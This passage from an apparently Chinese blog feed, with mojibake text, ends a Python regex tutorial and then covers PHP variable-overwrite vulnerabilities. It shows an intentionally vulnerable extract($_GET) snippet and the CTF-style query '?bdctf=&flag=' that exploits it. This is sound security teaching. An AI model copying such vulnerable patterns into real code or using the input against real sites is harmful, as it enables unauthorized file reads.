- - - - - - - - - - - - - - - - - - - - - - -&lt;re.Match object; span=(0, 3), match=&#39;foo&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ›¿æ¢</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ­£åˆ™è¡¨è¾¾å¼å¼•æ“å¹¶ä¸ä»…ä»…å±€é™äºè¯†åˆ«ä¸€ä¸ªæ¨¡å¼æ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­å­˜åœ¨ï¼Œå®ƒè¿˜èƒ½å¤Ÿæ‰§è¡Œå­—ç¬¦ä¸²æ›¿æ¢ï¼ŒåŸºäºåœ¨åŸå§‹å­—ç¬¦ä¸²ä¸­çš„åˆ†ç»„è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string">Pythonä¸­çš„æ›¿æ¢æ–¹æ³•æ˜¯re.subï¼Œä»–æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string">åªè¦å®é™…åŒ¹é…è¢«æ›¿æ¢ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…ï¼Œåˆ™re.subæœ€ç»ˆä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚</span></span><br><span class="line"><span class="string">re.subå…è®¸ä»è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä½¿ç”¨åŒæ ·çš„å›æº¯å¼•ç”¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸ªä»ç”µè¯å·ç ä¸­å‰¥ç¦»æ— å…³æ ¼å¼æ•°æ®çš„ä»»åŠ¡</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.sub(<span class="string">r&#x27;[\d]+&#x27;</span>,<span class="string">r&#x27;a&#x27;</span>,<span class="string">&#x27;213-667-8890&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># è¿˜å¯ä»¥åˆ©ç”¨subçš„åŠŸèƒ½ä½¿æ‰€æœ‰çš„ç”µè¯å·ç æ ¼å¼ä¸€è‡´</span></span><br><span class="line">b = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;213-667-8890&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;(213)8675509&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;213.867.5509&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;+1-213-854-5557&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;1213-854-5557&#x27;</span>)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><pre><code>a-a-a(213)667-8890(213)867-5509(213)867-5509(213)854-5557(213)854-5557</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å·²ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="comment">#reæ¨¡å—åŒ…å«ä¸€ä¸ªå‡½æ•°ï¼šcompileï¼Œå®ƒè¿”å›ä¸€ä¸ªå·²ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¹‹åå¯ä»¥è¢«å¤ç”¨</span></span><br><span class="line">regex = re.compile(<span class="string">r&#x27;[\d]&#123;3,4&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = regex.search(<span class="string">&#x27;578&#x27;</span>)</span><br><span class="line">b = regex.search(<span class="string">&#x27;ç¼–å·8975&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä½¿ç”¨å·²ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸¤ä¸ªå¥½å¤„ï¼š</span></span><br><span class="line"><span class="string">    å¯ç”¨äºä½œä¸ºæ–¹æ³•çš„å‚æ•°è¢«ä¼ é€’</span></span><br><span class="line"><span class="string">    å…è®¸ä½¿ç”¨åœ¨re.searchå…è®¸ä½¿ç”¨åœ¨re.searchä¸­ä¸å¯ç”¨çš„ä¸¤ä¸ªé¢å¤–å‚æ•°ï¼Œ</span></span><br><span class="line"><span class="string">    è¿™ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯è¢«æœç´¢å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸä½ç½®ï¼Œä»–ä»¬å¯ç”¨æ¥å‡å°‘å¯¹éƒ¨åˆ†å­—ç¬¦ä¸²çš„è€ƒè™‘</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">reg = re.compile(<span class="string">&#x27;[\d]+&#x27;</span>)</span><br><span class="line">c = reg.search(<span class="string">&#x27;1 ç¼–å·89757,wuhhhhh&#x27;</span>)</span><br><span class="line">d = reg.search(<span class="string">&#x27;1 ç¼–å·89757,wuhhhhh&#x27;</span>,pos=<span class="number">2</span>)</span><br><span class="line"><span class="comment">#posï¼šåŒ¹é…çš„èµ·å§‹ä½ç½®ï¼Œå¯é€‰ï¼Œé»˜è®¤ä¸º0</span></span><br><span class="line"><span class="comment">#endposï¼šåŒ¹é…çš„ç»“æŸä½ç½®ï¼Œå¯é€‰ï¼Œé»˜è®¤ä¸º len(string)</span></span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 3), match=&#39;578&#39;&gt;&lt;re.Match object; span=(2, 6), match=&#39;8975&#39;&gt;&lt;re.Match object; span=(0, 1), match=&#39;1&#39;&gt;&lt;re.Match object; span=(4, 9), match=&#39;89757&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ </span></span><br><span class="line">str=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¼ ä¼Ÿ 86-14870293148  \n</span></span><br><span class="line"><span class="string">   ç‹ä¼Ÿ   +86-13285654569    \n</span></span><br><span class="line"><span class="string">    ç‹èŠ³        15856529115    \n</span></span><br><span class="line"><span class="string"> æä¼Ÿ         13022816340  \n</span></span><br><span class="line"><span class="string">  ç‹ç§€è‹±   (86)14785720656     \n</span></span><br><span class="line"><span class="string">   æç§€è‹±    17201444672    \n</span></span><br><span class="line"><span class="string">    æå¨œ         15682812452     \n</span></span><br><span class="line"><span class="string">    å¼ ç§€è‹±         14326967740     \n</span></span><br><span class="line"><span class="string">    åˆ˜ä¼Ÿ  15146435743    \n</span></span><br><span class="line"><span class="string">   å¼ æ•        (86)-17712576838   \n</span></span><br><span class="line"><span class="string">    æé™       86 14295083635  \n</span></span><br><span class="line"><span class="string">    å¼ ä¸½     (+86) 13722348123   \n</span></span><br><span class="line"><span class="string">   ç‹é™         17587918887   \n</span></span><br><span class="line"><span class="string">  ç‹ä¸½    15493106739    \n</span></span><br><span class="line"><span class="string"> æå¼º      13786842977   \n</span></span><br><span class="line"><span class="string"> å¼ é™         86-15542304386     \n</span></span><br><span class="line"><span class="string">    ææ•         15642387356 \n</span></span><br><span class="line"><span class="string">   ç‹æ•          18627216756  \n</span></span><br><span class="line"><span class="string"> ç‹ç£Š       17206185726   \n</span></span><br><span class="line"><span class="string">    æå†›      17857426238     \n</span></span><br><span class="line"><span class="string">   åˆ˜æ´‹        17345352790     \n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#è¦æ±‚ï¼š</span></span><br><span class="line"><span class="comment"># 1.æå–æ‰€æœ‰ 11 ä½æ•°å­—ç”µè¯å·ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.æå–æ‰€æœ‰ 18 æˆ– 13 å¼€å¤´çš„ç”µè¯å·ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.æå–æ‰€æœ‰â€œç‹â€å§“åŒå­¦çš„åå­—</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.æå–æ‰€æœ‰â€œå¼ â€å§“åŒå­¦çš„ç”µè¯å·ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.é‡æ–°æ’ç‰ˆï¼Œæ’ç‰ˆæˆç»Ÿä¸€çš„æ ¼å¼ï¼Œå»æ‰å›½å®¶åŒºå·ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[\d]&#123;11&#125;&#x27;</span>,str)</span><br><span class="line"><span class="comment">#for i in a:</span></span><br><span class="line"><span class="comment">#    print(i)</span></span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">b = re.findall(<span class="string">r&#x27;1[3|8][\d]&#123;9&#125;&#x27;</span>,str)</span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">c = re.findall(<span class="string">r&#x27;ç‹\S*&#x27;</span>,str)s</span><br><span class="line">print(c)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">d = re.findall(<span class="string">r&#x27;(å¼ \S*)\s+\(?(\+?86?)?\)?[ .-]?([\d]&#123;11&#125;)&#x27;</span>,str)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> d:</span><br><span class="line">    print(line[<span class="number">0</span>]+<span class="string">&quot;çš„ç”µè¯æ˜¯ï¼š&quot;</span>+line[<span class="number">2</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>[&#39;14870293148&#39;, &#39;13285654569&#39;, &#39;15856529115&#39;, &#39;13022816340&#39;, &#39;14785720656&#39;, &#39;17201444672&#39;, &#39;15682812452&#39;, &#39;14326967740&#39;, &#39;15146435743&#39;, &#39;17712576838&#39;, &#39;14295083635&#39;, &#39;13722348123&#39;, &#39;17587918887&#39;, &#39;15493106739&#39;, &#39;13786842977&#39;, &#39;15542304386&#39;, &#39;15642387356&#39;, &#39;18627216756&#39;, &#39;17206185726&#39;, &#39;17857426238&#39;, &#39;17345352790&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[&#39;13285654569&#39;, &#39;13022816340&#39;, &#39;13722348123&#39;, &#39;13786842977&#39;, &#39;18627216756&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[&#39;ç‹ä¼Ÿ&#39;, &#39;ç‹èŠ³&#39;, &#39;ç‹ç§€è‹±&#39;, &#39;ç‹é™&#39;, &#39;ç‹ä¸½&#39;, &#39;ç‹æ•&#39;, &#39;ç‹ç£Š&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -å¼ ä¼Ÿçš„ç”µè¯æ˜¯ï¼š14870293148å¼ ç§€è‹±çš„ç”µè¯æ˜¯ï¼š14326967740å¼ æ•çš„ç”µè¯æ˜¯ï¼š17712576838å¼ ä¸½çš„ç”µè¯æ˜¯ï¼š13722348123å¼ é™çš„ç”µè¯æ˜¯ï¼š15542304386</code></pre><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><ul><li><a href="https://segmentfault.com/a/1190000018622193?utm_source=tag-newest">https://segmentfault.com/a/1190000018622193?utm_source=tag-newest</a></li><li><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Python-gt-re&quot;&gt;&lt;a href=&quot;#Python-gt-re&quot; class=&quot;headerlink&quot; title=&quot;Python-&amp;gt;re&quot;&gt;&lt;/a&gt;Python-&amp;gt;re&lt;/h2&gt;&lt;p&gt;  ä¹‹å‰æƒ³ç€ç©çˆ¬è™«ï¼Œç‰¹æ„æ‰¾ä¸€äº›å¤§ä½¬çš„æ–‡ç« å­¦çš„ï¼Œä½¿ç”¨&lt;co</summary>
      
    
    
    
    <category term="Python" scheme="https://taonn.github.io/categories/Python/"/>
    
    
    <category term="æ­£åˆ™è¡¨è¾¾å¼" scheme="https://taonn.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHPå˜é‡è¦†ç›–å­¦ä¹ </title>
    <link href="https://taonn.github.io/2020/10/04/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://taonn.github.io/2020/10/04/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-04T01:08:31.000Z</published>
    <updated>2021-03-16T05:27:35.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p> <strong>è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢åŸæœ‰å˜é‡å€¼çš„æƒ…å†µç§°ä¸ºå˜é‡è¦†ç›–æ¼æ´</strong> </p><p> <strong>$$**ä½¿ç”¨ä¸å½“ï¼Œ</strong>extract()<strong>å‡½æ•°ä½¿ç”¨ä¸å½“ï¼Œ</strong>parse_str()<strong>å‡½æ•°ä½¿ç”¨ä¸å½“ï¼Œ</strong>import_request_variables()**ä½¿ç”¨ä¸å½“ï¼Œå¼€å¯äº†å…¨å±€å˜é‡æ³¨å†Œç­‰ </p><h2 id="å¯¼è‡´çš„å˜é‡è¦†ç›–"><a href="#å¯¼è‡´çš„å˜é‡è¦†ç›–" class="headerlink" title="$$ å¯¼è‡´çš„å˜é‡è¦†ç›–"></a>$$ å¯¼è‡´çš„å˜é‡è¦†ç›–</h2><p> <strong>$$è¿™ç§å†™æ³•ç§°ä¸ºå¯å˜å˜é‡</strong> </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113144232213.png" alt="image-20191113144232213"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;betao.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a; <span class="comment">// é¦–å…ˆ$a = b; ç„¶å$$a = $b; å› ä¸º$b=&#x27;betao.cn&#x27;ï¼Œæ‰€ä»¥è¿™é‡Œè¾“å‡º&#x27;betao.cn&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113145056443.png" alt="image-20191113145056443"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;123&#x27;</span>; <span class="comment">// å®šä¹‰å˜é‡$a,å€¼ä¸º123</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// è¾“å‡ºå€¼</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$&#123;$key&#125; = $value; <span class="comment">// è¿™é‡Œå°±æ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œé‡æ–°å®šä¹‰äº†å˜é‡$açš„å€¼</span></span><br><span class="line">    <span class="comment">// $_GETä¼ å…¥å‚æ•°a,ä½¿$key = a; é‚£ä¹ˆ$&#123;$key&#125; = $a; ç„¶åé‡æ–°å®šä¹‰å€¼ï¼Œä¿®æ”¹äº†åŸæœ‰çš„å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// è¿™é‡Œå°±è¢«æ”¹å˜äº†</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="extract-å‡½æ•°ä½¿ç”¨ä¸å½“"><a href="#extract-å‡½æ•°ä½¿ç”¨ä¸å½“" class="headerlink" title="extract()å‡½æ•°ä½¿ç”¨ä¸å½“"></a>extract()å‡½æ•°ä½¿ç”¨ä¸å½“</h2><blockquote><p> <a href="https://www.runoob.com/php/func-array-extract.html">https://www.runoob.com/php/func-array-extract.html</a> </p></blockquote><p>å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œå³å°†æ•°ç»„ä¸­çš„é”®å€¼å¯¹æ³¨å†Œæˆå‡½æ•°ï¼Œä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113145722544.png" alt="image-20191113145722544"></p><p> <strong>ä»ä»¥ä¸Šè¯´æ˜æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ï¼Œä¼šä¸ä¼šå¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ç”±ç¬¬äºŒä¸ªå‚æ•°å†³å®šï¼Œè¯¥å‡½æ•°æœ‰ä¸‰ç§æƒ…å†µä¼šè¦†ç›–å·²æœ‰å˜é‡</strong> </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113150125531.png" alt="image-20191113150125531"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;123&#x27;</span>; <span class="comment">// å®šä¹‰å˜é‡$açš„å€¼ä¸º123</span></span><br><span class="line">$b = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;betao.cn&#x27;</span>); <span class="comment">// å®šä¹‰æ•°ç»„</span></span><br><span class="line">extract($b); <span class="comment">// æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œæ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// è¾“å‡ºbetao.cn</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET); <span class="comment">// GETå˜é‡è¦†ç›–</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($bdctf)) <span class="comment">//åˆ¤æ–­å˜é‡bdctfæ˜¯å¦å­˜åœ¨</span></span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag)); <span class="comment">//file_get_contentsâ€”å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">//trimâ€”å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰</span></span><br><span class="line"><span class="keyword">if</span>($bdctf==$content) <span class="comment">// è¿™é‡Œéœ€è¦ä½¿å¾—$bdctf==$content</span></span><br><span class="line">&#123; <span class="keyword">echo</span><span class="string">&#x27;&#123;betao.cn&#125;&#x27;</span>; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">echo</span><span class="string">&#x27;è¿™ä¸æ˜¯è“ç›¾çš„å¯†ç å•Š&#x27;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æï¼šéœ€è¦å­˜åœ¨<code>$bdctf</code>å˜é‡ï¼Œ<code>$bdctf==$content</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä¹‰<code>?bdctf=&amp;flag=</code>æ‹¿åˆ°flag</p><p>å…¶ä¸­ï¼Œå› ä¸º<code>content</code>è¯»å–çš„æ˜¯<code>$flag</code>çš„å€¼(æ•°æ®æµ)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113151446634.png" alt="image-20191113151446634"></p><h2 id="parse-str-å‡½æ•°"><a href="#parse-str-å‡½æ•°" class="headerlink" title="parse_str()å‡½æ•°"></a>parse_str()å‡½æ•°</h2><blockquote><p> <a href="https://www.w3school.com.cn/php/func_string_parse_str.asp">https://www.w3school.com.cn/php/func_string_parse_str.asp</a> </p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113151644506.png" alt="image-20191113151644506"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">parse_str(<span class="string">&quot;a=betao.cn&quot;</span>); <span class="comment">//ç»è¿‡parse_str()å‡½æ•°ï¼Œé‡æ–°èµ‹å€¼å˜é‡$a=&#x27;betao.cn&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113152059386.png" alt="image-20191113152059386"></p><h2 id="import-request-variables-å‡½æ•°"><a href="#import-request-variables-å‡½æ•°" class="headerlink" title="import_request_variables()å‡½æ•°"></a>import_request_variables()å‡½æ•°</h2><blockquote><p> <a href="https://www.php.net/manual/zh/function.import-request-variables.php">https://www.php.net/manual/zh/function.import-request-variables.php</a> </p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113152356893.png" alt="image-20191113152356893"></p><ul><li>å°† GETï¼POSTï¼Cookie å˜é‡å¯¼å…¥åˆ°å…¨å±€ä½œç”¨åŸŸä¸­, </li><li>types å‚æ•°æŒ‡å®šéœ€è¦å¯¼å…¥çš„å˜é‡, Gä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIE</li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113152651562.png" alt="image-20191113152651562"></p><p>  <strong>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šimport_request_variables()å‡½æ•°å‡½æ•°åªèƒ½ç”¨åœ¨ PHP4.1 ~ PHP5.4ä¹‹é—´ï¼Œé¢å¤–ä»¥ä¸Šä¸‰ç§å‡½æ•°ï¼Œä½¿ç”¨æ—¶è¯·æ ¼å¤–æ³¨æ„ï¼Œå¦åˆ™éå¸¸å®¹æ˜“å‡ºç°å˜é‡è¦†ç›–æ¼æ´</strong> </p><h2 id="æ¼æ´é˜²èŒƒ"><a href="#æ¼æ´é˜²èŒƒ" class="headerlink" title="æ¼æ´é˜²èŒƒ"></a>æ¼æ´é˜²èŒƒ</h2><h2 id="extract-å‡½æ•°é˜²å¾¡"><a href="#extract-å‡½æ•°é˜²å¾¡" class="headerlink" title="extract()å‡½æ•°é˜²å¾¡"></a>extract()å‡½æ•°é˜²å¾¡</h2><p> å°†extract.phpä¸­extract()å‡½æ•°<strong>ç¬¬äºŒä¸ªå‚æ•°ä¿®æ”¹ä¸ºextr_skip</strong>:</p><p><img 